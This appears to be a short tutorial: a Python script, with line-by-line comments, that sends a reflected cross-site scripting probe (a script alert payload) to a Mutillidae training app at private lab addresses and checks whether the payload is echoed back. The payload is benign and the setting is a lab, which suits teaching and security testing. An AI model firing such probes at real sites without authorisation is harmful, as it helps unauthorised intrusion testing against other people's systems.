
# Here's another example that demonstrates how to perform a simple cross-site scripting (XSS) attack using Python's `requests` library:

# Simple Cross-Site Scripting (XSS) Attack

import requests

def perform_xss_attack(url, vulnerable_parameter):
    # XSS payload
    payload = "<script>alert('XSS Attack!');</script>"

    # Construct the URL with the payload
    target_url = f"{url}?{vulnerable_parameter}={payload}"

    # Send a GET request with the malicious payload
    response = requests.get(target_url)

    # Check if the payload is reflected in the response
    if payload in response.text:
        print("XSS Attack successful! The application is vulnerable.")
    else:
        print("XSS Attack unsuccessful. The application is likely secure.")

def main():
    # URL of the vulnerable web application
    # vulnerable_url = "http://192.168.124.216/mutillidae/"
    vulnerable_url = "http://192.168.207.128/mutillidae/"

    # Parameter vulnerable to XSS
    vulnerable_parameter = "query"

    print("Performing XSS Attack...")
    perform_xss_attack(vulnerable_url, vulnerable_parameter)

if __name__ == "__main__":
    main()

# We define a function `perform_xss_attack()` that takes the URL of a vulnerable web application and the name of a parameter vulnerable to XSS as input.
# We construct an XSS payload that consists of a simple JavaScript alert (`<script>alert('XSS Attack!');</script>`). This payload is appended to the URL as a query parameter.
# We send a GET request to the target URL with the malicious payload using the `requests.get()` function.
# We check if the payload is reflected in the response by searching for the payload in the response text.
# In the `main()` function, we specify the URL of the vulnerable web application and the vulnerable parameter, and then call the `perform_xss_attack()` function to execute the attack.

